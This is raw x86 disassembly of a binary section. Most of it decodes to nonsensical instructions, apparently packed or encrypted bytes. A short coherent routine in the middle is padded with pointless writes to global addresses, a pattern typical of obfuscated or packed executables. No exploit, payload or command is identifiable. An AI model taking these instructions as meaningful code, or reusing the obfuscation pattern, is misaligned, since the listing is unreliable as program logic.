  4085bb:	and    eax,0xb030fe4f
  4085c0:	in     al,dx
  4085c1:	or     BYTE PTR [edx+edx*2],0xf4
  4085c5:	xor    dl,BYTE PTR [esi+edi*2-0x63]
  4085c9:	test   BYTE PTR [ebp+ebx*1+0x7e],0x84
  4085ce:	int3   
  4085cf:	icebp  
  4085d0:	and    BYTE PTR [esi],bh
  4085d2:	loop   0x40863d
  4085d4:	fmul   st(4),st
  4085d6:	popa   
  4085d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085d8:	mov    ch,0xe6
  4085da:	retf   0xeac2
  4085dd:	cwde   
  4085de:	ret    0x5c8f
  4085e1:	xlat   BYTE PTR ds:[ebx]
  4085e2:	sbb    BYTE PTR [ebx+eiz*4],bl
  4085e5:	push   edi
  4085e6:	xchg   DWORD PTR [ebp-0x29d84585],edi
  4085ec:	cmp    DWORD PTR [eax-0x5fee6512],0x8a02436e
  4085f6:	ficom  DWORD PTR ds:0x4e935800
  4085fc:	fst    QWORD PTR [edi+edi*2]
  4085ff:	pop    esi
  408600:	js     0x4085ec
  408602:	adc    esi,DWORD PTR [edi]
  408604:	test   BYTE PTR [eax-0x206fcaf3],al
  40860a:	fdivr  QWORD PTR [ebp+0x45]
  40860d:	jp     0x40860b
  40860f:	pop    esp
  408610:	jmp    0x40868b
  408612:	adc    DWORD PTR [ebp-0xaf4bef0],eax
  408618:	mov    ah,BYTE PTR [ebp+0x8]
  40861b:	into   
  40861c:	sub    BYTE PTR [ebp-0x44],cl
  40861f:	sbb    ebp,DWORD PTR cs:[eax-0x6f]
  408623:	lock push ecx
  408625:	aam    0x19
  408627:	es xor al,0xf3
  40862a:	lods   al,BYTE PTR ds:[esi]
  40862b:	adc    DWORD PTR [edi+ecx*2+0x7b],edx
  40862f:	and    dh,cl
  408631:	pusha  
  408632:	pop    esp
  408633:	inc    edi
  408634:	jge    0x4085c1
  408636:	daa    
  408637:	dec    edi
  408638:	cmp    esi,ebx
  40863a:	push   es
  40863b:	mov    esp,0x9575ff13
  408640:	cwde   
  408641:	test   al,0xcb
  408643:	jb     0x40862b
  408645:	scas   eax,DWORD PTR es:[edi]
  408646:	test   eax,0x83986b91
  40864b:	inc    BYTE PTR [ebx+0xd96059b]
  408651:	inc    ebx
  408652:	cmc    
  408653:	sti    
  408654:	rcr    DWORD PTR [ecx],cl
  408656:	jno    0x40864f
  408658:	jg     0x40860f
  40865a:	xor    dl,BYTE PTR [edx+0x6b8f62b]
  408660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408661:	sbb    edi,DWORD PTR [esi+0x3d]
  408664:	sbb    DWORD PTR [ebp+0x2990c781],esi
  40866a:	test   DWORD PTR [edi+eiz*2],ebp
  40866d:	cld    
  40866e:	jb     0x408666
  408670:	jge    0x4085f5
  408672:	sub    ecx,ecx
  408674:	ja     0x40863d
  408676:	mov    edi,0x7de8bca6
  40867b:	sbb    al,0xb3
  40867d:	or     al,0xad
  40867f:	stc    
  408680:	lods   al,BYTE PTR ds:[esi]
  408681:	cmp    DWORD PTR [edi],esi
  408683:	cmp    BYTE PTR ds:0xf06d0b5d,bl
  408689:	(bad)  
  40868a:	stos   BYTE PTR es:[edi],al
  40868b:	inc    ebp
  40868c:	ins    DWORD PTR es:[edi],dx
  40868d:	cmc    
  40868e:	mov    dh,0xfc
  408690:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408691:	je     0x4086e6
  408693:	cmp    BYTE PTR [esi+0x3c],dl
  408696:	pop    ebx
  408697:	pop    eax
  408698:	adc    BYTE PTR [edi+0x4a],bh
  40869b:	jno    0x4086dd
  40869d:	pop    esi
  40869e:	mov    BYTE PTR ds:0xe2671e0c,bl
  4086a4:	pushf  
  4086a5:	mov    esp,0x1273d0c0
  4086aa:	aaa    
  4086ab:	(bad)  
  4086ad:	aaa    
  4086ae:	bound  eax,QWORD PTR [edx-0x52e8affd]
  4086b4:	push   0xffffff95
  4086b6:	pop    ss
  4086b7:	add    ecx,DWORD PTR [ebp-0x7efb12ee]
  4086bd:	push   cs
  4086be:	or     BYTE PTR [eax+ebp*4+0xc1e0dda],0x30
  4086c6:	mov    bh,0x9d
  4086c8:	and    ch,bh
  4086ca:	dec    edx
  4086cb:	push   cs
  4086cc:	push   0x4
  4086ce:	sbb    al,0xeb
  4086d0:	test   al,0x8b
  4086d2:	mov    edi,0x9aee6c1e
  4086d7:	and    DWORD PTR [edx],eax
  4086d9:	push   0xffffffe5
  4086db:	je     0x4086d6
  4086dd:	sbb    edi,0xc4697ed9
  4086e3:	sbb    eax,DWORD PTR [ebp+0x73]
  4086e6:	loop   0x4086fd
  4086e8:	movhps xmm0,QWORD PTR [eax-0x5a6ca66f]
  4086ef:	inc    edx
  4086f0:	cmp    esi,edi
  4086f2:	dec    ecx
  4086f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086f4:	or     eax,0xa37fc47c
  4086f9:	int3   
  4086fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086fb:	(bad)  
  4086fc:	test   DWORD PTR [ebp+0x37],ecx
  4086ff:	inc    edx
  408700:	inc    edx
  408701:	sbb    al,0x6d
  408703:	dec    BYTE PTR [ebx+eax*2-0x71]
  408707:	push   cs
  408708:	nop
  408709:	xor    dl,BYTE PTR [edi+ecx*4]
  40870c:	sub    dl,BYTE PTR ds:0x32bfc1d
  408712:	lock jmp 0x7af62de8
  408718:	dec    ecx
  408719:	rcr    DWORD PTR [eax-0x5fb7c7dd],0x3b
  408720:	js     0x408769
  408722:	dec    eax
  408723:	sbb    ah,dh
  408725:	pop    ss
  408726:	fs clc 
  408728:	lds    edi,FWORD PTR [eax+edx*2]
  40872b:	retf   
  40872c:	dec    esp
  40872d:	jb     0x4087a5
  40872f:	pop    esi
  408730:	pop    ecx
  408731:	clc    
  408732:	(bad)  
  408733:	arpl   WORD PTR [edi],si
  408735:	or     dh,ch
  408737:	lods   al,BYTE PTR ds:[esi]
  408738:	adc    DWORD PTR [ebp+eax*8-0x7f],0x29
  40873d:	xor    eax,0x22b1d4c0
  408742:	arpl   si,sp
  408744:	ror    BYTE PTR [ebp+0x2a],0x85
  408748:	stc    
  408749:	into   
  40874a:	std    
  40874b:	addr16 mov ah,0x25
  40874e:	neg    DWORD PTR [esi+0xd]
  408751:	pop    ecx
  408752:	ds repnz xor ch,BYTE PTR gs:[edx]
  408757:	inc    ecx
  408758:	mov    bh,0x64
  40875a:	jmp    FWORD PTR [ebx-0x1ef4b6eb]
  408760:	ins    DWORD PTR es:[edi],dx
  408761:	test   eax,0xd2e80b79
  408766:	popf   
  408767:	and    al,BYTE PTR [edx]
  408769:	cmp    edx,ebx
  40876b:	xor    edx,DWORD PTR [ebp+0x2a34e07]
  408771:	add    bh,bh
  408773:	add    DWORD PTR [ecx],esp
  408775:	movlhps xmm2,xmm3
  408778:	and    eax,0x8cf3bfce
  40877d:	loop   0x408717
  40877f:	push   edi
  408780:	mov    ebp,0xbf11d9e8
  408785:	(bad)  
  408786:	mov    cl,0x41
  408788:	rcl    DWORD PTR [esi-0x3fa3192b],cl
  40878e:	jno    0x408717
  408790:	push   edi
  408791:	repnz ficom DWORD PTR [ecx-0xe]
  408795:	push   0x649cd5a
  40879a:	xor    eax,0x49299e3b
  40879f:	push   ss
  4087a0:	in     al,dx
  4087a1:	add    ecx,DWORD PTR [edx-0x10e9abb6]
  4087a7:	mov    esi,0x8e3765cf
  4087ac:	imul   esi,DWORD PTR [edi-0x3e56ddef],0xffffff87
  4087b3:	popa   
  4087b4:	aam    0xe7
  4087b6:	ins    DWORD PTR es:[edi],dx
  4087b7:	jge    0x40873b
  4087b9:	push   cs
  4087ba:	mov    ds:0x79a526cf,al
  4087bf:	repnz aad 0x38
  4087c2:	stos   DWORD PTR es:[edi],eax
  4087c3:	loope  0x408804
  4087c5:	imul   edx,DWORD PTR [edi-0x50],0xfffffff0
  4087c9:	std    
  4087ca:	sub    BYTE PTR [ecx],ah
  4087cc:	sub    eax,0x4912dae
  4087d1:	sub    BYTE PTR [ecx-0x60],dl
  4087d4:	mov    edi,0x3dd89cf9
  4087d9:	test   di,0xf781
  4087de:	call   0x8bdcb36d
  4087e3:	iret   
  4087e4:	shrd   eax,ecx,0x2
  4087e8:	or     eax,DWORD PTR [ebp+0x10]
  4087eb:	shr    ecx,0x2
  4087ee:	or     ecx,DWORD PTR [ebp+0x14]
  4087f1:	jmp    0x408b92
  4087f6:	sbb    cl,cl
  4087f8:	ins    DWORD PTR es:[edi],dx
  4087f9:	xchg   esi,eax
  4087fa:	mov    bl,0xba
  4087fc:	cmp    BYTE PTR [edx+ebp*4-0x21],cl
  408800:	xchg   esp,eax
  408801:	nop
  408802:	jecxz  0x4087ce
  408804:	fist   WORD PTR [eax-0x41418c42]
  40880a:	mov    ebp,0x80bebec4
  40880f:	mov    DWORD PTR [ecx-0x3c],0xa0cfc660
  408816:	lds    esp,FWORD PTR [eax+0x7e0875c3]
  40881c:	sub    ebp,DWORD PTR [esi-0x65622342]
  408822:	push   0xffffff88
  408824:	ja     0x40888b
  408826:	jp     0x4087ca
  408828:	sub    esp,DWORD PTR [edi-0x51fe763d]
  40882e:	push   ecx
  40882f:	ss add al,0x7e
  408832:	push   esp
  408833:	lock dec ebp
  408835:	lea    ecx,es:[edi+0x3f000b8c]
  40883c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40883d:	fisub  WORD PTR [ecx-0x45]
  408840:	or     dh,ch
  408842:	popf   
  408843:	push   cs
  408844:	stc    
  408845:	gs ja  0x40886b
  408848:	and    BYTE PTR [edi+esi*2-0x4f649198],bl
  40884f:	jp     0x40883a
  408851:	lahf   
  408852:	or     bh,BYTE PTR [edi-0x7162061e]
  408858:	sub    eax,DWORD PTR [ecx+0x5953aa9b]
  40885e:	fdivr  DWORD PTR [edx-0x53]
  408861:	jns    0x4087e8
  408863:	push   edx
  408864:	and    al,0xf7
  408866:	xchg   esp,eax
  408867:	fiadd  WORD PTR [esi]
  408869:	cmp    al,0x9d
  40886b:	push   ds
  40886c:	mov    edx,ebp
  40886e:	test   BYTE PTR [edx+0x4ed3a05b],0x8e
  408875:	stos   BYTE PTR es:[edi],al
  408876:	dec    ebx
  408877:	add    BYTE PTR [ebp+eax*8-0x17],0xd2
  40887c:	pusha  
  40887d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40887e:	add    al,0x51
  408880:	lods   al,BYTE PTR ds:[esi]
  408881:	test   DWORD PTR [ebx],edx
  408883:	stc    
  408884:	xor    al,0x69
  408886:	add    DWORD PTR cs:[eax],eax
  408889:	scas   eax,DWORD PTR es:[edi]
  40888a:	div    BYTE PTR [esi+0x43]
  40888d:	shl    al,1
  40888f:	inc    edx
  408890:	push   0x2b917af8
  408895:	rcl    BYTE PTR [edx+0x9],0x6a
  408899:	in     eax,dx
  40889a:	jg     0x4088da
  40889c:	retf   0x2181
  40889f:	cwde   
  4088a0:	retf   0xe5c8
  4088a3:	shl    DWORD PTR ds:0x9386da38,0x8a
  4088aa:	pop    ebp
  4088ab:	cmp    DWORD PTR [esi+0x12c569e1],ebp
  4088b1:	ja     0x408920
  4088b3:	imul   edi,ebp,0xbe5ea380
  4088b9:	stos   DWORD PTR es:[edi],eax
  4088ba:	jecxz  0x4088a3
  4088bc:	and    eax,DWORD PTR [esi+0x2d]
  4088bf:	adc    eax,0x539ac518
  4088c4:	jb     0x4088d5
  4088c6:	idiv   BYTE PTR [esp+esi*1-0xf]
  4088ca:	ret    
  4088cb:	sub    DWORD PTR [edx+ebp*4+0x6c],eax
  4088cf:	sub    ch,dl
  4088d1:	mov    ds:0x51775488,al
  4088d6:	pop    esp
  4088d7:	and    eax,0xc583b1d0
  4088dc:	inc    eax
  4088dd:	pushf  
  4088de:	mov    edx,0xd62f9c88
  4088e3:	fdiv   QWORD PTR [edi+0x46]
  4088e6:	push   esi
  4088e7:	mov    ecx,?
  4088e9:	mov    ds,WORD PTR [ebx-0x5b01ed79]
  4088ef:	push   edx
  4088f0:	shl    BYTE PTR [ecx],cl
  4088f2:	xor    esi,eax
  4088f4:	cmp    eax,0x1e3a4029
  4088f9:	inc    esi
  4088fa:	sti    
  4088fb:	test   DWORD PTR [edx],edx
  4088fd:	(bad)  
  4088fe:	jmp    0x408973
  408900:	lahf   
  408901:	and    eax,0x145108cf
  408906:	ja     0x408977
  408908:	add    al,0x95
  40890a:	fst    st(2)
  40890c:	gs dec ebp
  40890e:	pop    edi
  40890f:	int3   
  408910:	test   BYTE PTR [ecx+0x4a],bh
  408913:	int    0x84
  408915:	dec    esp
  408916:	popf   
  408917:	cmp    DWORD PTR [esi],edi
  408919:	cmp    esi,DWORD PTR [eax-0x31]
  40891c:	imul   edx,DWORD PTR [edi],0x24493325
  408922:	dec    edi
  408923:	test   eax,0xa4b5cdfb
  408928:	push   ds
  408929:	or     ebx,DWORD PTR ds:0xc340c165
  40892f:	fbstp  TBYTE PTR [eax]
  408931:	and    eax,0xd560d70
  408936:	(bad)  
  408937:	jp     0x4088f8
  408939:	dec    ecx
  40893a:	xor    BYTE PTR [edx+0x56288532],dh
  408940:	int3   
  408941:	idiv   al
  408943:	push   ss
  408944:	stc    
  408945:	dec    esi
  408946:	push   esi
  408947:	mov    esi,0x2810be59
  40894c:	ja     0x4088fc
  40894e:	jbe    0x40892e
  408950:	and    ecx,DWORD PTR [ebx-0x57]
  408953:	sub    eax,0x728ffc22
  408958:	sub    bl,BYTE PTR [eax+0x25e070a1]
  40895e:	inc    eax
  40895f:	add    DWORD PTR [eax+0x10],0x97a95e56
  408966:	iret   
  408967:	je     0x4089c3
  408969:	or     ebp,DWORD PTR [edx+edx*4+0x7]
  40896d:	inc    ebp
  40896e:	and    al,0xe2
  408970:	mov    DWORD PTR [ebx+edx*8-0x7e],edi
  408974:	sub    al,0x9c
  408976:	pop    edi
  408977:	xchg   ecx,eax
  408978:	or     cl,BYTE PTR [edx+0x7235fb8b]
  40897e:	repnz dec ebp
  408980:	xchg   ebx,eax
  408981:	psrld  mm2,QWORD PTR [esi]
  408984:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408985:	dec    edi
  408986:	in     al,dx
  408987:	scas   al,BYTE PTR es:[edi]
  408988:	rcl    ch,cl
  40898a:	into   
  40898b:	xchg   ebx,eax
  40898c:	outs   dx,BYTE PTR ds:[esi]
  40898d:	rcl    DWORD PTR [ecx-0x4a],cl
  408990:	lods   al,BYTE PTR ds:[esi]
  408991:	mov    dl,0x10
  408993:	in     al,dx
  408994:	rcr    DWORD PTR [ebx-0x71],cl
  408997:	std    
  408998:	fnstcw WORD PTR [edx-0x6b]
  40899b:	aam    0x18
  40899d:	fcomp  DWORD PTR [edi+0x351187bd]
  4089a3:	pop    eax
  4089a4:	mov    edx,0x7146f6b9
  4089a9:	sbb    eax,0xb1b3544e
  4089ae:	sbb    ebp,edi
  4089b0:	mov    eax,0x53195743
  4089b5:	xor    BYTE PTR [ebp+0x65],bl
  4089b8:	dec    ebx
  4089b9:	xlat   BYTE PTR ds:[ebx]
  4089ba:	test   DWORD PTR [edi],edi
  4089bc:	fdiv   QWORD PTR [esi+0x185def5d]
  4089c2:	enter  0x71e3,0x93
  4089c6:	or     ecx,DWORD PTR [eax-0x5ee4dc0b]
  4089cc:	lea    edi,[ecx]
  4089ce:	js     0x408a37
  4089d0:	dec    eax
  4089d1:	mov    ds:0x131f4497,eax
  4089d6:	rcl    BYTE PTR [ebp+0x2ceb7c7a],0x33
  4089dd:	pop    esi
  4089de:	scas   al,BYTE PTR es:[edi]
  4089df:	jnp    0x408a12
  4089e1:	jp     0x4089b3
  4089e3:	jmp    0x33f96a0a
  4089e8:	adc    eax,0x105a0c5a
  4089ed:	jp     0x4089ca
  4089ef:	or     al,0x90
  4089f1:	ds into 
  4089f3:	mov    BYTE PTR [eax+0x5d],dh
  4089f6:	mov    dl,0x25
  4089f8:	push   cs
  4089f9:	sub    al,0xde
  4089fb:	mov    eax,0x940280d9
  408a00:	sub    DWORD PTR [ecx-0x51],eax
  408a03:	inc    edi
  408a04:	mov    ds:0x8a2415b9,al
  408a09:	test   esi,esp
  408a0b:	xchg   ah,ah
  408a0d:	xchg   DWORD PTR [edi-0x33],esp
  408a10:	repz cmp esi,DWORD PTR [ecx-0x773d0d6e]
  408a17:	sub    ecx,DWORD PTR [ebx-0x7e78c441]
  408a1d:	jmp    DWORD PTR [edx-0x5e]
  408a20:	push   edx
  408a21:	cmp    ebp,esi
  408a23:	adc    eax,0x72d5c889
  408a28:	dec    edx
  408a29:	pushf  
  408a2a:	cld    
  408a2b:	int    0xe7
  408a2d:	aaa    
  408a2e:	(bad)  
  408a2f:	mov    edi,0xa8bdf060
  408a34:	cmc    
  408a35:	lods   eax,DWORD PTR ds:[esi]
  408a36:	mov    esi,0x27f5303d
  408a3b:	xor    BYTE PTR [ebp+0x15],ah
  408a3e:	mov    al,0xf6
  408a40:	mov    ebp,0x273d75c8
  408a45:	call   0xf0efb1b2
  408a4a:	push   ss
  408a4b:	xor    DWORD PTR [edx],edi
  408a4d:	xor    eax,0xad5c131
  408a52:	test   al,0x1
  408a54:	iret   
  408a55:	js     0x408a44
  408a57:	fst    QWORD PTR [eax+edx*1]
  408a5a:	and    ebx,DWORD PTR [esi]
  408a5c:	push   edi
  408a5d:	stos   DWORD PTR es:[edi],eax
  408a5e:	jge    0x408aab
  408a60:	pop    es
  408a61:	dec    ebx
  408a62:	or     eax,0x6704283
  408a67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a68:	stos   DWORD PTR es:[edi],eax
  408a69:	jmp    0x58c:0x3e81678a
  408a70:	mov    al,ds:0x539d872a
  408a75:	push   esi
  408a76:	pop    esp
  408a77:	cld    
  408a78:	jmp    0x4649:0x98c90ce8
  408a7f:	retf   
  408a80:	dec    edi
  408a81:	enter  0xab99,0x20
  408a85:	xchg   edi,eax
  408a86:	pop    edi
  408a87:	sub    al,BYTE PTR [esp+ebp*2]
  408a8a:	mov    esp,0xc9e02254
  408a8f:	push   ds
  408a90:	loope  0x408a59
  408a92:	or     DWORD PTR [ebx],edi
  408a94:	popa   
  408a95:	sub    eax,0xbc6cd9c2
  408a9a:	jge    0x408a24
  408a9c:	fwait
  408a9d:	test   ebp,0x62852eed
  408aa3:	stos   BYTE PTR es:[edi],al
  408aa4:	mul    DWORD PTR [eax]
  408aa6:	dec    ah
  408aa8:	jp     0x408a2d
  408aaa:	add    esp,DWORD PTR [esi*4-0x12db3371]
  408ab1:	lods   eax,DWORD PTR ds:[esi]
  408ab2:	lods   al,BYTE PTR ds:[esi]
  408ab3:	mov    BYTE PTR [edx-0x2296ac5],cl
  408ab9:	stos   DWORD PTR es:[edi],eax
  408aba:	sub    eax,0x47d4a277
  408abf:	and    ebp,edi
  408ac1:	jp     0x408b14
  408ac3:	jae    0x408aab
  408ac5:	sbb    BYTE PTR [edx+esi*1],al
  408ac8:	addr16 sub eax,edx
  408acb:	bound  ecx,QWORD PTR [eax+0x75]
  408ace:	push   ecx
  408acf:	rcl    ch,1
  408ad1:	popf   
  408ad2:	sbb    al,0xab
  408ad4:	xchg   edx,eax
  408ad5:	out    dx,al
  408ad6:	imul   edx,DWORD PTR [esi+0x1],0xffffffa2
  408ada:	push   0xffffffe6
  408adc:	fld    DWORD PTR [ebp+0x266753bb]
  408ae2:	push   ebp
  408ae3:	lahf   
  408ae4:	mov    dl,0xb6
  408ae6:	in     al,dx
  408ae7:	stos   BYTE PTR es:[edi],al
  408ae8:	inc    ebx
  408ae9:	aas    
  408aea:	adc    al,BYTE PTR [ebx+edx*1+0x682a3eb3]
  408af1:	mov    eax,0x70c6da2b
  408af6:	(bad)  
  408af7:	fwait
  408af8:	sar    BYTE PTR [eax],0xb9
  408afb:	sbb    al,0x10
  408afd:	sar    BYTE PTR [edi],0x3b
  408b00:	clc    
  408b01:	pop    es
  408b02:	adc    al,BYTE PTR [ebx-0x3046c3f4]
  408b08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b09:	stc    
  408b0a:	push   0xb
  408b0c:	addr16 xchg esi,eax
  408b0e:	fmul   QWORD PTR [edi+0x2b7f83eb]
  408b14:	fst    QWORD PTR [edi]
  408b16:	aaa    
  408b17:	rcl    DWORD PTR [edi],cl
  408b19:	es push esp
  408b1b:	rcl    BYTE PTR [ecx],cl
  408b1d:	mov    eax,ds:0x5908fccb
  408b22:	jb     0x408b54
  408b24:	out    0x1d,al
  408b26:	outs   dx,BYTE PTR ds:[esi]
  408b27:	jnp    0x408aec
  408b29:	sub    al,0x65
  408b2b:	sbb    esp,DWORD PTR [esi]
  408b2d:	push   0xffffffc0
  408b2f:	jmp    0x5f984d7d
  408b34:	mov    bl,0xc9
  408b36:	(bad)  
  408b38:	in     al,dx
  408b39:	sub    eax,0x454be10a
  408b3e:	int    0xa8
  408b40:	push   ecx
  408b41:	pop    esp
  408b42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b43:	mov    cl,0xd8
  408b45:	and    BYTE PTR [ecx-0xd],bh
  408b48:	add    ah,0x86
  408b4b:	and    eax,0xa466630b
  408b50:	imul   edx,DWORD PTR [ecx-0x7f],0x1b
  408b54:	cli    
  408b55:	cwde   
  408b56:	xchg   edx,eax
  408b57:	ja     0x408b9b
  408b59:	bound  ebp,QWORD PTR [ebp-0x646f2437]
  408b5f:	add    al,BYTE PTR ds:0xee2fcb48
  408b65:	popa   
  408b66:	lea    esp,[eax+0x8]
  408b69:	loop   0x408b4e
  408b6b:	mov    ch,0xbf
  408b6d:	cmp    cl,BYTE PTR [edx+0x3632b68b]
  408b73:	jp     0x408b73
  408b75:	dec    esp
  408b76:	mov    ah,0xad
  408b78:	mov    esi,0x55b3f81
  408b7d:	dec    edi
  408b7e:	dec    esi
  408b7f:	(bad)  
  408b80:	sbb    eax,ebp
  408b82:	pop    DWORD PTR [ebp-0x2ef60d65]
  408b88:	mov    bh,0x99
  408b8a:	inc    edi
  408b8b:	cmp    sp,cx
  408b8e:	repnz stos DWORD PTR es:[edi],eax
  408b90:	sbb    eax,0xfd03bd3
  408b95:	test   DWORD PTR [ecx],ecx
  408b97:	add    BYTE PTR [eax],al
  408b99:	add    BYTE PTR [ecx],bh
  408b9b:	dec    ebp
  408b9c:	or     al,0xf
  408b9e:	test   BYTE PTR [eax],dl
  408ba0:	add    BYTE PTR [eax],al
  408ba2:	add    bh,bh
  408ba4:	jne    0x408bc6
  408ba6:	push   DWORD PTR [ebp+0x1c]
  408ba9:	push   DWORD PTR [ebp+0x18]
  408bac:	push   ebx
  408bad:	push   esi
  408bae:	call   0x411472
  408bb3:	pop    edi
  408bb4:	leave  
  408bb5:	ret    0x1c
  408bb8:	cmp    cl,0x40
  408bbb:	jae    0x408bf8
  408bc1:	cmp    cl,0x20
  408bc4:	mov    DWORD PTR ds:0x42833d,0x1ce5
  408bce:	jae    0x408be4
  408bd4:	xor    DWORD PTR ds:0x428501,0x6917
  408bde:	shrd   eax,edx,cl
  408be1:	shr    edx,cl
  408be3:	ret    
  408be4:	mov    eax,edx
  408be6:	xor    edx,edx
  408be8:	and    cl,0x1f
  408beb:	mov    DWORD PTR ds:0x428559,0x321d
  408bf5:	shr    eax,cl
  408bf7:	ret    
  408bf8:	xor    eax,eax
  408bfa:	xor    edx,edx
  408bfc:	ret    
  408bfd:	push   ebp
  408bfe:	mov    ebp,esp
  408c00:	jmp    0x408e7f
  408c05:	addr16 hlt 
  408c07:	js     0x408c4d
  408c09:	jl     0x408c57
  408c0b:	jnp    0x408c09
  408c0d:	dec    edx
  408c0e:	xlat   BYTE PTR ds:[ebx]
  408c0f:	pop    esi
  408c10:	sahf   
  408c11:	ffree  st(5)
  408c13:	push   esp
  408c14:	sahf   
  408c15:	mov    ebp,0x79bebe79
  408c1a:	ret    0xbebe
  408c1d:	cwde   
  408c1e:	xlat   BYTE PTR ds:[ebx]
  408c1f:	or     eax,0x4b978589
  408c24:	jmp    0x6f7e:0x7b5dcbaa
  408c2b:	mov    ecx,0xd8403fc6
  408c30:	out    dx,eax
  408c31:	cwde   
  408c32:	and    DWORD PTR [edi],0x6cf88058
  408c38:	cmp    dl,BYTE PTR [edi]
  408c3a:	data16 mov bl,0x8e
  408c3d:	pop    ss
  408c3e:	fidivr WORD PTR [ebx+0x1]
  408c41:	je     0x408c1f
  408c43:	add    cl,bh
  408c45:	cmp    ecx,esi
  408c47:	sti    
  408c48:	(bad)  
  408c49:	pop    ebx
  408c4a:	in     eax,0xa2
  408c4c:	das    
  408c4d:	mov    dl,0x2b
  408c4f:	das    
  408c50:	in     al,dx
  408c51:	shl    eax,1
  408c53:	inc    eax
  408c54:	fs cmp eax,0x21176067
  408c5a:	push   eax
  408c5b:	mov    eax,0x8c6309a7
  408c60:	dec    edi
  408c61:	and    DWORD PTR [ebx-0x492261e8],ecx
  408c67:	loope  0x408c8c
  408c69:	add    al,0x16
  408c6b:	ret    
  408c6c:	push   cs
  408c6d:	and    al,0x28
  408c70:	or     DWORD PTR [ebx-0x78],esi
  408c73:	scas   al,BYTE PTR es:[edi]
  408c74:	retf   
  408c75:	shr    ah,1
  408c77:	pop    esp
  408c78:	lods   al,BYTE PTR fs:[esi]
  408c7a:	push   esi
  408c7b:	pop    ebx
  408c7c:	cmp    edx,ebx
  408c7e:	mov    ecx,?
  408c80:	sahf   
  408c81:	adc    DWORD PTR [ebx-0x575c4d41],edi
  408c87:	mov    esi,0x6f95702b
  408c8c:	mov    dl,0xdf
  408c8e:	sbb    al,0x70
  408c90:	xchg   edi,eax
  408c91:	into   
  408c92:	fimul  WORD PTR [ebx-0x69e24828]
  408c98:	mov    dl,0xc3
  408c9a:	je     0x408ceb
  408c9c:	stos   DWORD PTR es:[edi],eax
  408c9d:	rcr    DWORD PTR [eax],1
  408c9f:	test   DWORD PTR [ecx-0x5c],0x7f6887b0
  408ca6:	mov    eax,0x3a762b82
  408cab:	add    al,0xf4
  408cad:	cs pop eax
  408caf:	xchg   edx,eax
  408cb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cb1:	or     edi,ecx
  408cb3:	test   al,0xba
  408cb5:	xchg   ebx,eax
  408cb6:	and    ebx,DWORD PTR [edx+0x71]
  408cb9:	xchg   ah,bl
  408cbb:	aad    0x18
  408cbd:	and    eax,0x835c10c3
  408cc2:	and    DWORD PTR [edx+ebx*8-0x1c0400ee],ebp
  408cc9:	push   edx
  408cca:	nop
  408ccb:	sub    DWORD PTR [ebx-0x289d4368],esi
  408cd1:	dec    eax
  408cd2:	popf   
  408cd3:	and    DWORD PTR [ecx-0x7a0c88be],ebx
  408cd9:	gs (bad) 
  408cde:	pushf  
  408cdf:	test   al,0x7b
  408ce1:	in     eax,0xe8
  408ce3:	jno    0x408d05
  408ce5:	inc    edx
  408ce6:	stos   DWORD PTR es:[edi],eax
  408ce7:	test   DWORD PTR [ebp-0xf],edx
  408cea:	sub    ecx,DWORD PTR [ebx]
  408cec:	push   ebx
  408ced:	lods   al,BYTE PTR ds:[esi]
  408cee:	stos   DWORD PTR es:[edi],eax
  408cef:	jl     0x408d42
  408cf1:	jae    0x408cb0
  408cf3:	inc    edx
  408cf4:	outs   dx,BYTE PTR ds:[esi]
  408cf5:	push   edx
  408cf6:	or     DWORD PTR [edx+0x9],eax
  408cf9:	leave  
  408cfa:	in     al,0xb7
  408cfc:	dec    edx
  408cfd:	ret    0x2e81
  408d00:	or     DWORD PTR [eax],eax
  408d02:	jl     0x408d72
  408d04:	add    bh,0x8
  408d07:	push   es
  408d08:	bound  edx,QWORD PTR [ebx-0xb6b3d4b]
  408d0e:	adc    DWORD PTR [edi],eax
  408d10:	loop   0x408d6e
  408d12:	sub    eax,0x8411a438
  408d17:	sbb    ecx,esi
  408d19:	shl    BYTE PTR [edi],1
  408d1b:	sar    dh,0x12
  408d1e:	sahf   
  408d1f:	aad    0xc6
  408d21:	push   ss
  408d22:	stos   BYTE PTR es:[edi],al
  408d23:	inc    ebx
  408d24:	sbb    ecx,0x34
  408d27:	repnz dec DWORD PTR [ecx-0x21]
  408d2b:	test   eax,0x37082f01
  408d30:	inc    ebx
  408d31:	gs jne 0x408d93
  408d34:	shl    BYTE PTR [ebx+0x52907afe],0x5
  408d3b:	pop    esi
  408d3c:	mov    fs,WORD PTR [ebx-0x3c2d22e6]
  408d42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d43:	out    0xfd,eax
  408d45:	cmp    eax,0x9d922aa7
  408d4a:	dec    edi
  408d4b:	xor    BYTE PTR [esi],cl
  408d4d:	je     0x408dcd
  408d4f:	inc    esi
  408d50:	push   0x67
  408d52:	stc    
  408d53:	jp     0x408d93
  408d55:	mov    al,ds:0xda008c1b
  408d5a:	mov    edx,DWORD PTR [ebx+ecx*4+0xa4334ab]
  408d61:	dec    ecx
  408d62:	xchg   ecx,eax
  408d63:	sub    ah,BYTE PTR [eax+0x4185126f]
  408d69:	test   DWORD PTR [eax+edx*8+0x511a7218],edi
  408d70:	dec    edx
  408d71:	call   FWORD PTR [eax]
  408d73:	xor    DWORD PTR [ebx],eax
  408d75:	in     eax,dx
  408d76:	scas   eax,DWORD PTR es:[edi]
  408d77:	test   ebp,0x901ef29d
  408d7d:	mov    edi,0x9c577056
  408d82:	ficomp DWORD PTR [eax+0x56]
  408d85:	imul   esi,DWORD PTR [ecx+0x6a],0xffffffe5
  408d89:	mov    ebp,0x20d4f752
  408d8e:	sbb    BYTE PTR [ecx],0x72
  408d91:	mov    edx,esp
  408d93:	fidiv  DWORD PTR [ecx+0x124ad39]
  408d99:	fldenv [edi-0x2f]
  408d9c:	loop   0x408d9f
